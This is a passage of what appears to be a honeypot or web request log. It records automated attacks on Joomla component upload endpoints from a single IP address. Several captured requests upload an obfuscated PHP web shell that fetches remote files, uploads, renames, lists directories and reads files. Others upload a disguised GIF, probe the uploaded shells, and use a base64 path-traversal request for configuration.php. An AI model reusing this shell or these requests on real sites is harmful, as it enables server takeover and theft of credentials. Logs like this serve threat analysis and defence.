+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5",
+  "content-length": "2620"
+}
+::ffff:46.105.99.212
+{}
+{"--d4883626f5ccb0c45c4e9a4df4744bdb\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nupload\r\n--d4883626f5ccb0c45c4e9a4df4744bdb\r\nContent-Disposition: form-data; name=\"upload-dir\"\r\n\r\n/\r\n--d4883626f5ccb0c45c4e9a4df4744bdb\r\nContent-Disposition: form-data; name=\"upload-overwrite\"\r\n\r\n0\r\n--d4883626f5ccb0c45c4e9a4df4744bdb\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"shell.jpg\"\r\n\r\n<title>Vuln!! patch it Now!</title><?php error_reporting(0);$sr=\"st\"./* /* */\"rr\"/* /* */.\"ev\";$id=$sr/* /* */(\"ri\".\"d_\".\"si\");$rn=$sr/* /* */(\"em\".\"an\".\"er\");$dn=$sr/* /* */(\"em\".\"anr\".\"id\");$od=$sr/* /* */(\"ri\".\"dne\".\"po\");$rd=$sr/* /* */(\"ri\".\"dda\".\"er\");$cd=$sr/* /* */(\"ri\".\"deso\".\"lc\");$fpc=$sr/* /* */(\"stn\".\"etn\".\"oc_t\".\"up_e\".\"lif\");$fgc=$sr/* /* */(\"stn\".\"etn\".\"oc_t\".\"eg_e\".\"lif\");$muf=$sr/* /* */(\"eli\".\"f_d\".\"eda\".\"olp\".\"u_e\".\"vom\");$dlform='<form method=\"post\">FN:<input name=\"fn\" size=\"20\" type=\"text\">URL:<input name=\"url\" size=\"50\" type=\"text\"><input type=\"submit\" value=\"ok\"></form>';$ulform='<form method=\"post\" enctype=\"multipart/form-data\"><input name=\"uf\" type=\"file\">SP:<input name=\"sp\" size=\"50\" type=\"text\"><input type=\"submit\" value=\"ok\"></form>';$rnform='<form method=\"post\">ON:<input name=\"on\" size=\"50\" type=\"text\">NN:<input name=\"nn\" size=\"50\" type=\"text\"><input type=\"submit\" value=\"ok\"></form>';$lpform='<form method=\"post\">DP:<input name=\"dp\" size=\"50\" type=\"text\"><input type=\"submit\" value=\"ok\"></form>';$sfform='<form method=\"post\">DF:<input name=\"df\" size=\"50\" type=\"text\"><input type=\"submit\" value=\"ok\"></form>';if($_GET":{"'act'":"='dl'){echo($dlform);if($_SERVER['REQUEST_METHOD']=='POST'){$fpc/* /* */($_POST['fn'],$fgc/* /* */($_POST['url']));}exit;}if($_GET['act']=='ul'){echo($ulform);if($_SERVER['REQUEST_METHOD']=='POST'){$sp=empty($_POST['sp'])?'./':$_POST['sp'].'/';$muf/* /* */($/* /* */{\"_F\".\"IL\".\"ES\"}[\"uf\"][\"tmp_name\"],$sp.$/* /* */{\"_F\".\"IL\".\"ES\"}[\"uf\"][\"name\"]);}exit;}if($_GET['act']=='rn'){echo($rnform);if($_SERVER['REQUEST_METHOD']=='POST'){$rn/* /* */($_POST['on'],$_POST['nn']);}exit;}if($_GET['act']=='gp'){echo($dn/* /* */(__FILE__));exit;}if($_GET['act']=='lp'){echo($lpform);if($_SERVER['REQUEST_METHOD']=='POST'){$dp=$_POST['dp'].'/';$h=$od/* /* */($dp);while(($fn=$rd/* /* */($h))!==false){if($id/* /* */($dp.$fn)){$t1.='D"},"nbsp;'.$fn.'<br>';}else{$t2.":"'","nbsp;":"","nbsp;'.$fn.'<br>';}}$cd/* /* */($dp);echo($dp.'<br>'.$t1.$t2);}exit;}if($_GET":{"'act'":"='sf'){echo($sfform);if($_SERVER['REQUEST_METHOD']=='POST'){$df=$_POST['df'];echo('<textarea style=\"width:100%;height:100%;\" wrap=\"off\">'.$fgc/*+/*+*/($df).'</textarea>');}exit;}?>\r\n--d4883626f5ccb0c45c4e9a4df4744bdb--\r\n"}}
+**END SECURE REQUEST
+========= REQ #100==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form
+2019:08:01:11:56:39
+POST
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5",
+  "content-length": "2900"
+}
+::ffff:46.105.99.212
+{}
+{"--84c70604f568e91af5d1b97c50f79819\r\nContent-Disposition: form-data; name":"\"action\"\r\n\r\nupload\r\n--84c70604f568e91af5d1b97c50f79819\r\nContent-Disposition: form-data; name=\"upload-dir\"\r\n\r\n../../\r\n--84c70604f568e91af5d1b97c50f79819\r\nContent-Disposition: form-data; name=\"upload-overwrite\"\r\n\r\n0\r\n--84c70604f568e91af5d1b97c50f79819\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"pwn.gif\"\r\n\r\nGIF89a\u0018\u0001G\u0000p\u0000\u0000!�\u0004\u0001\u0000\u0000�\u0000,\u0000\u0000\u0000\u0000\u0018\u0001G\u0000�\u0000\u0000\u0000\u0000\u00003\u0000\u0000f\u0000\u0000�\u0000\u0000�\u0000\u0000�\u0000 \u0000\u0000 3\u0000 f\u0000 �\u0000 �\u0000 �\u0000U\u0000\u0000U3\u0000Uf\u0000U�\u0000U�\u0000U�\u0000�\u0000\u0000�3\u0000�f\u0000��\u0000��\u0000��\u0000�\u0000\u0000�3\u0000�f\u0000��\u0000��\u0000��\u0000�\u0000\u0000�3\u0000�f\u0000ՙ\u0000��\u0000��\u0000�\u0000\u0000�3\u0000�f\u0000��\u0000��\u0000��3\u0000\u00003\u000033\u0000f3\u0000�3\u0000�3\u0000�3 \u00003 33 f3 �3 �3 �3U\u00003U33Uf3U�3U�3U�3�\u00003�33�f3��3��3��3�\u00003�33�f3��3��3��3�\u00003�33�f3ՙ3��3��3�\u00003�33�f3��3��3��f\u0000\u0000f\u00003f\u0000ff\u0000�f\u0000�f\u0000�f \u0000f 3f ff �f �f �fU\u0000fU3fUffU�fU�fU�f�\u0000f�3f�ff��f��f��f�\u0000f�3f�ff��f��f��f�\u0000f�3f�ffՙf��f��f�\u0000f�3f�ff��f��f���\u0000\u0000�\u00003�\u0000f�\u0000��\u0000̙\u0000�� \u0000� 3� f� �� ̙ ��U\u0000�U3�Uf�U��U̙U���\u0000��3��f�����̙����\u0000��3��f�����̙����\u0000��3��f�ՙ��̙����\u0000��3��f�����̙���\u0000\u0000�\u00003�\u0000f�\u0000��\u0000��\u0000�� \u0000� 3� f� �� �� ��U\u0000�U3�Uf�U��U��U�̀\u0000̀3̀f̀�̀�̀�̪\u0000̪3̪f̪�̪�̪���\u0000��3��f�ՙ��������\u0000��3��f����������\u0000\u0000�\u00003�\u0000f�\u0000��\u0000��\u0000�� \u0000� 3� f� �� �� ��U\u0000�U3�Uf�U��U��U���\u0000��3��f�����������\u0000��3��f�����������\u0000��3��f�ՙ��������\u0000��3��f���������\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\b�\u0000\u0001\b\u001cH����\b\u0013*\\Ȱ�Ç\u0010#J�H��ŋ\u00183j�ȱ�Ǐ C�\u001cI��ɓ(S�\\ɲ�˗0cʜI��͛8s��ɳ�ϟ@�\n\u001dJ��ѣH�*]ʴ�ӧP�J�J��իX�j�ʵ�ׯ`Ê\u001dK��ٳhӪ]˶�۷p�ʝK��\u0003e��\u0002\u0011�Bk\u0000P�\u0006�\r�2�\"��\u0013\u0002Qv�a\u000ee� \"\u0000ELYeb���D�l����)>�����a�;\"��W���","\u001f'��q�2�\u0005\u001dT���\b1a\u0017m Ӕ���\u0001�0�(\u001b7�ǐ\u0013���q2l�G�E]p1oɔ\u001b\u0013�L�\f6C5� >H\u0006\\�_�\u0011�C$\u000fF����\u0015��,��\u0000ʘd�\u0011v��b^Kp\u0010\u0013\fF�}7�d�D�\u0010\u0010�\u0005�[j��\u0012Q�\u000b>�^\u0017q��h�e��\u000f�\t��k��\b�b�U�؁\u0000<���\b�\u0017�D�\u001d8Z�\u0010�\b�\u0000�(S�FB*�\u001ef\u0017\u001e�\u0018w\u001e\u0011\b��.-�\u000bB��n�\t���\u0003\u001d��@V\nV�@\u000f�x�\u0003�\t�":"","�\u000b��\u001d�m$gB�%#\u0006(x\u001d�\u0003qTT�Z����\u0018o\u0010\u001aw\u0019u�U�\f1�8h�\u0011\u00124�rh��%�j$#�@y��Xe�\"��2\u0012\u0012��{�]fb�LZ��^����_��U��A�\u0016�ꢻޕ�\u0016�\u0019�\u001dn�UV�{�,\u000b�b�":"F��\t\u00188�G�u�^q�\u0015�W��-��B���di94�,1��:�0i�:\u001c��*\u0003f��>جe�<�\f\u0015\u0001\u0014�(����_g��\n@��l��p\tKjи\u000b\u000b|\u0019��\u001a�e�@�G\u0010��M7��]N�\u0018���٣f��\u000b��ƶ�]{\u0000�%qA�e\u0012�u(�\u0011m\u0012�I���\nɔ�9WP�G\u0003@)�\u0003Q��c4\u000bT��\u0005�v䳭�'�0���\u0010�\u0005]�3B������}���(\u000bDi�еG\u001eowќ�Iw����@��,]�hb�ܝS�G��\u000f\u0012���\n,A�����T�Fޮ\u000b\"��y��7��\r�kEƸ�q��z��\u0001����\u0005�:m+\u0017.xGY�J91@\n�X����'o3\u0016��0�X�,m�w�oQS��A蕨ɍΗJ���\u0003_�\u0003�t9i�`�J}B�\u001b�_�h[[oƉ{��xE\u0012\u001d�{��\u0019z�z+\u000f�d'����\u000e�ڍCf����n ���@\u0012���.v�\u001b�\u001b�<��rY+�]�W�\u0000؁q\u0003y��\b\u0018�ݭ�5��Ɋ���=pap�Dc2w�]@�v�q\u0011��v�\u0011�vU\u001bH��sC<�L\u000byR\u001a�\nT��\u0001�T���ƣ�-\u0012do\u0004�Vw�7Abx1jĹ^�ا�#v,�-̎o�3�\u001by�zF�\u001d\u0000�`��,\"K�\u0012�H��#�lL\u001d3�t�S���o:nKPd\f��\f\u0012����\f\f\u001fCB\u0015�ʒ�A`\u001c�,\u0018\u001a\u0004��)ݚ*��؅�]T\u0010@\u001d8��eM","\u0019U�ÿ�\u0012\f\u0004|�rC$\u0014\u00117��\u0010B�4�[\by2Q$/\u0006�R�8Nr��\u001d\u0014e1�\u0006)�A��\u001ef�c�\"F�\u000eB��H\u0010Km4\u00168�ٶ�YF\u0012�i \u0005�g9�����I�0�6���`fg�1g�\u001c�5S��_��b�|��B�Gvpd\u0015-��P�\\\r�\u0000`�0>�":"","bt\u0013��t\u000e���%��P�":{"2�i4��\u0001�r��Ld��fQ��/�b����E�\n~\n�P2v\u00150�H���\u0012O�TE\f�M�\u0010�\f_\u000eV����\u0013�{\u0018�\u001ae�)��z�d#N�z�ca�D�y�Q�7��8t1_͔�@�\u0019\u0012\u0014\u001d1s�)��\u0012F�\u0013�ү�L�r�*�C�Q���h6e�(ah¡5B,\u001c\u0006f�T�.;(\"aA���":""}}
+**END SECURE REQUEST
+========= REQ #101==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form
+2019:08:01:11:56:47
+POST
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5",
+  "content-length": "432"
+}
+::ffff:46.105.99.212
+{}
+{"--9a58ee344a0dec8be3e3176fc49f7388\r\nContent-Disposition: form-data; name":"\"action\"\r\n\r\nupload\r\n--9a58ee344a0dec8be3e3176fc49f7388\r\nContent-Disposition: form-data; name=\"upload-dir\"\r\n\r\n../\r\n--9a58ee344a0dec8be3e3176fc49f7388\r\nContent-Disposition: form-data; name=\"upload-overwrite\"\r\n\r\n0\r\n--9a58ee344a0dec8be3e3176fc49f7388\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"pwn.gif\"\r\n\r\n\r\n--9a58ee344a0dec8be3e3176fc49f7388--\r\n"}
+**END SECURE REQUEST
+========= REQ #102==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA=
+2019:08:01:11:56:55
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #103==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/components/com_jbcatalog/libraries/jsupload/server/php
+2019:08:01:11:57:03
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #104==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/components/com_jbcatalog/libraries/jsupload/server/php
+2019:08:01:11:57:14
+POST
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5",
+  "content-length": "2333"
+}
+::ffff:46.105.99.212
+{}
+{"--7697512e2d261e901a04efe8a60e2095\r\nContent-Disposition: form-data; name=\"files":[{"'act'":"='dl'){echo($dlform);if($_SERVER['REQUEST_METHOD']=='POST'){$fpc/* /* */($_POST['fn'],$fgc/* /* */($_POST['url']));}exit;}if($_GET['act']=='ul'){echo($ulform);if($_SERVER['REQUEST_METHOD']=='POST'){$sp=empty($_POST['sp'])?'./':$_POST['sp'].'/';$muf/* /* */($/* /* */{\"_F\".\"IL\".\"ES\"}[\"uf\"][\"tmp_name\"],$sp.$/* /* */{\"_F\".\"IL\".\"ES\"}[\"uf\"][\"name\"]);}exit;}if($_GET['act']=='rn'){echo($rnform);if($_SERVER['REQUEST_METHOD']=='POST'){$rn/* /* */($_POST['on'],$_POST['nn']);}exit;}if($_GET['act']=='gp'){echo($dn/* /* */(__FILE__));exit;}if($_GET['act']=='lp'){echo($lpform);if($_SERVER['REQUEST_METHOD']=='POST'){$dp=$_POST['dp'].'/';$h=$od/* /* */($dp);while(($fn=$rd/* /* */($h))!==false){if($id/* /* */($dp.$fn)){$t1.='D"}],"nbsp;'.$fn.'<br>';}else{$t2.":"'","nbsp;":"","nbsp;'.$fn.'<br>';}}$cd/* /* */($dp);echo($dp.'<br>'.$t1.$t2);}exit;}if($_GET":{"'act'":"='sf'){echo($sfform);if($_SERVER['REQUEST_METHOD']=='POST'){$df=$_POST['df'];echo('<textarea style=\"width:100%;height:100%;\" wrap=\"off\">'.$fgc/*+/*+*/($df).'</textarea>');}exit;}?>\r\n--7697512e2d261e901a04efe8a60e2095--\r\n"}}
+**END SECURE REQUEST
+========= REQ #105==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/components/com_jbcatalog/libraries/jsupload/server/php/files/up.php
+2019:08:01:11:57:21
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #106==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/components/com_jbcatalog/libraries/jsupload/server/php
+2019:08:01:11:57:29
+POST
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5",
+  "content-length": "2611"
+}
+::ffff:46.105.99.212
+{}
+{"--e5425886f968a9df920a749dc3da5187\r\nContent-Disposition: form-data; name":"\"files[]\"; filename=\"pwn.gif\"\r\n\r\nGIF89a\u0018\u0001G\u0000p\u0000\u0000!�\u0004\u0001\u0000\u0000�\u0000,\u0000\u0000\u0000\u0000\u0018\u0001G\u0000�\u0000\u0000\u0000\u0000\u00003\u0000\u0000f\u0000\u0000�\u0000\u0000�\u0000\u0000�\u0000 \u0000\u0000 3\u0000 f\u0000 �\u0000 �\u0000 �\u0000U\u0000\u0000U3\u0000Uf\u0000U�\u0000U�\u0000U�\u0000�\u0000\u0000�3\u0000�f\u0000��\u0000��\u0000��\u0000�\u0000\u0000�3\u0000�f\u0000��\u0000��\u0000��\u0000�\u0000\u0000�3\u0000�f\u0000ՙ\u0000��\u0000��\u0000�\u0000\u0000�3\u0000�f\u0000��\u0000��\u0000��3\u0000\u00003\u000033\u0000f3\u0000�3\u0000�3\u0000�3 \u00003 33 f3 �3 �3 �3U\u00003U33Uf3U�3U�3U�3�\u00003�33�f3��3��3��3�\u00003�33�f3��3��3��3�\u00003�33�f3ՙ3��3��3�\u00003�33�f3��3��3��f\u0000\u0000f\u00003f\u0000ff\u0000�f\u0000�f\u0000�f \u0000f 3f ff �f �f �fU\u0000fU3fUffU�fU�fU�f�\u0000f�3f�ff��f��f��f�\u0000f�3f�ff��f��f��f�\u0000f�3f�ffՙf��f��f�\u0000f�3f�ff��f��f���\u0000\u0000�\u00003�\u0000f�\u0000��\u0000̙\u0000�� \u0000� 3� f� �� ̙ ��U\u0000�U3�Uf�U��U̙U���\u0000��3��f�����̙����\u0000��3��f�����̙����\u0000��3��f�ՙ��̙����\u0000��3��f�����̙���\u0000\u0000�\u00003�\u0000f�\u0000��\u0000��\u0000�� \u0000� 3� f� �� �� ��U\u0000�U3�Uf�U��U��U�̀\u0000̀3̀f̀�̀�̀�̪\u0000̪3̪f̪�̪�̪���\u0000��3��f�ՙ��������\u0000��3��f����������\u0000\u0000�\u00003�\u0000f�\u0000��\u0000��\u0000�� \u0000� 3� f� �� �� ��U\u0000�U3�Uf�U��U��U���\u0000��3��f�����������\u0000��3��f�����������\u0000��3��f�ՙ��������\u0000��3��f���������\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\b�\u0000\u0001\b\u001cH����\b\u0013*\\Ȱ�Ç\u0010#J�H��ŋ\u00183j�ȱ�Ǐ C�\u001cI��ɓ(S�\\ɲ�˗0cʜI��͛8s��ɳ�ϟ@�\n\u001dJ��ѣH�*]ʴ�ӧP�J�J��իX�j�ʵ�ׯ`Ê\u001dK��ٳhӪ]˶�۷p�ʝK��\u0003e��\u0002\u0011�Bk\u0000P�\u0006�\r�2�\"��\u0013\u0002Qv�a\u000ee� \"\u0000ELYeb���D�l����)>�����a�;\"��W���","\u001f'��q�2�\u0005\u001dT���\b1a\u0017m Ӕ���\u0001�0�(\u001b7�ǐ\u0013���q2l�G�E]p1oɔ\u001b\u0013�L�\f6C5� >H\u0006\\�_�\u0011�C$\u000fF����\u0015��,��\u0000ʘd�\u0011v��b^Kp\u0010\u0013\fF�}7�d�D�\u0010\u0010�\u0005�[j��\u0012Q�\u000b>�^\u0017q��h�e��\u000f�\t��k��\b�b�U�؁\u0000<���\b�\u0017�D�\u001d8Z�\u0010�\b�\u0000�(S�FB*�\u001ef\u0017\u001e�\u0018w\u001e\u0011\b��.-�\u000bB��n�\t���\u0003\u001d��@V\nV�@\u000f�x�\u0003�\t�":"","�\u000b��\u001d�m$gB�%#\u0006(x\u001d�\u0003qTT�Z����\u0018o\u0010\u001aw\u0019u�U�\f1�8h�\u0011\u00124�rh��%�j$#�@y��Xe�\"��2\u0012\u0012��{�]fb�LZ��^����_��U��A�\u0016�ꢻޕ�\u0016�\u0019�\u001dn�UV�{�,\u000b�b�":"F��\t\u00188�G�u�^q�\u0015�W��-��B���di94�,1��:�0i�:\u001c��*\u0003f��>جe�<�\f\u0015\u0001\u0014�(����_g��\n@��l��p\tKjи\u000b\u000b|\u0019��\u001a�e�@�G\u0010��M7��]N�\u0018���٣f��\u000b��ƶ�]{\u0000�%qA�e\u0012�u(�\u0011m\u0012�I���\nɔ�9WP�G\u0003@)�\u0003Q��c4\u000bT��\u0005�v䳭�'�0���\u0010�\u0005]�3B������}���(\u000bDi�еG\u001eowќ�Iw����@��,]�hb�ܝS�G��\u000f\u0012���\n,A�����T�Fޮ\u000b\"��y��7��\r�kEƸ�q��z��\u0001����\u0005�:m+\u0017.xGY�J91@\n�X����'o3\u0016��0�X�,m�w�oQS��A蕨ɍΗJ���\u0003_�\u0003�t9i�`�J}B�\u001b�_�h[[oƉ{��xE\u0012\u001d�{��\u0019z�z+\u000f�d'����\u000e�ڍCf����n ���@\u0012���.v�\u001b�\u001b�<��rY+�]�W�\u0000؁q\u0003y��\b\u0018�ݭ�5��Ɋ���=pap�Dc2w�]@�v�q\u0011��v�\u0011�vU\u001bH��sC<�L\u000byR\u001a�\nT��\u0001�T���ƣ�-\u0012do\u0004�Vw�7Abx1jĹ^�ا�#v,�-̎o�3�\u001by�zF�\u001d\u0000�`��,\"K�\u0012�H��#�lL\u001d3�t�S���o:nKPd\f��\f\u0012����\f\f\u001fCB\u0015�ʒ�A`\u001c�,\u0018\u001a\u0004��)ݚ*��؅�]T\u0010@\u001d8��eM","\u0019U�ÿ�\u0012\f\u0004|�rC$\u0014\u00117��\u0010B�4�[\by2Q$/\u0006�R�8Nr��\u001d\u0014e1�\u0006)�A��\u001ef�c�\"F�\u000eB��H\u0010Km4\u00168�ٶ�YF\u0012�i \u0005�g9�����I�0�6���`fg�1g�\u001c�5S��_��b�|��B�Gvpd\u0015-��P�\\\r�\u0000`�0>�":"","bt\u0013��t\u000e���%��P�":{"2�i4��\u0001�r��Ld��fQ��/�b����E�\n~\n�P2v\u00150�H���\u0012O�TE\f�M�\u0010�\f_\u000eV����\u0013�{\u0018�\u001ae�)��z�d#N�z�ca�D�y�Q�7��8t1_͔�@�\u0019\u0012\u0014\u001d1s�)��\u0012F�\u0013�ү�L�r�*�C�Q���h6e�(ah¡5B,\u001c\u0006f�T�.;(\"aA���":""}}
+**END SECURE REQUEST
+========= REQ #107==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/components/com_jbcatalog/libraries/jsupload/server/php/files/pwn.gif
+2019:08:01:11:57:36
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #108==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/components/com_sexycontactform/fileupload/
+2019:08:01:11:57:42
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #109==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/components/com_sexycontactform/fileupload/
+2019:08:01:11:57:50
+POST
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5",
+  "content-length": "2333"
+}
+::ffff:46.105.99.212
+{}
+{"--57f9e2588262c903de111929a2b5d644\r\nContent-Disposition: form-data; name=\"files":[{"'act'":"='dl'){echo($dlform);if($_SERVER['REQUEST_METHOD']=='POST'){$fpc/* /* */($_POST['fn'],$fgc/* /* */($_POST['url']));}exit;}if($_GET['act']=='ul'){echo($ulform);if($_SERVER['REQUEST_METHOD']=='POST'){$sp=empty($_POST['sp'])?'./':$_POST['sp'].'/';$muf/* /* */($/* /* */{\"_F\".\"IL\".\"ES\"}[\"uf\"][\"tmp_name\"],$sp.$/* /* */{\"_F\".\"IL\".\"ES\"}[\"uf\"][\"name\"]);}exit;}if($_GET['act']=='rn'){echo($rnform);if($_SERVER['REQUEST_METHOD']=='POST'){$rn/* /* */($_POST['on'],$_POST['nn']);}exit;}if($_GET['act']=='gp'){echo($dn/* /* */(__FILE__));exit;}if($_GET['act']=='lp'){echo($lpform);if($_SERVER['REQUEST_METHOD']=='POST'){$dp=$_POST['dp'].'/';$h=$od/* /* */($dp);while(($fn=$rd/* /* */($h))!==false){if($id/* /* */($dp.$fn)){$t1.='D"}],"nbsp;'.$fn.'<br>';}else{$t2.":"'","nbsp;":"","nbsp;'.$fn.'<br>';}}$cd/* /* */($dp);echo($dp.'<br>'.$t1.$t2);}exit;}if($_GET":{"'act'":"='sf'){echo($sfform);if($_SERVER['REQUEST_METHOD']=='POST'){$df=$_POST['df'];echo('<textarea style=\"width:100%;height:100%;\" wrap=\"off\">'.$fgc/*+/*+*/($df).'</textarea>');}exit;}?>\r\n--57f9e2588262c903de111929a2b5d644--\r\n"}}
+**END SECURE REQUEST
+========= REQ #110==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/components/com_sexycontactform/fileupload/files/up.php
+2019:08:01:11:57:57
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #111==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/components/com_jbcatalog/libraries/jsupload/server/php
+2019:08:01:11:58:07
+POST
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5",
+  "content-length": "2611"
+}
+::ffff:46.105.99.212
+{}
+{"--1955b0d9bb49a198dcf01959b787fc1f\r\nContent-Disposition: form-data; name":"\"files[]\"; filename=\"pwn.gif\"\r\n\r\nGIF89a\u0018\u0001G\u0000p\u0000\u0000!�\u0004\u0001\u0000\u0000�\u0000,\u0000\u0000\u0000\u0000\u0018\u0001G\u0000�\u0000\u0000\u0000\u0000\u00003\u0000\u0000f\u0000\u0000�\u0000\u0000�\u0000\u0000�\u0000 \u0000\u0000 3\u0000 f\u0000 �\u0000 �\u0000 �\u0000U\u0000\u0000U3\u0000Uf\u0000U�\u0000U�\u0000U�\u0000�\u0000\u0000�3\u0000�f\u0000��\u0000��\u0000��\u0000�\u0000\u0000�3\u0000�f\u0000��\u0000��\u0000��\u0000�\u0000\u0000�3\u0000�f\u0000ՙ\u0000��\u0000��\u0000�\u0000\u0000�3\u0000�f\u0000��\u0000��\u0000��3\u0000\u00003\u000033\u0000f3\u0000�3\u0000�3\u0000�3 \u00003 33 f3 �3 �3 �3U\u00003U33Uf3U�3U�3U�3�\u00003�33�f3��3��3��3�\u00003�33�f3��3��3��3�\u00003�33�f3ՙ3��3��3�\u00003�33�f3��3��3��f\u0000\u0000f\u00003f\u0000ff\u0000�f\u0000�f\u0000�f \u0000f 3f ff �f �f 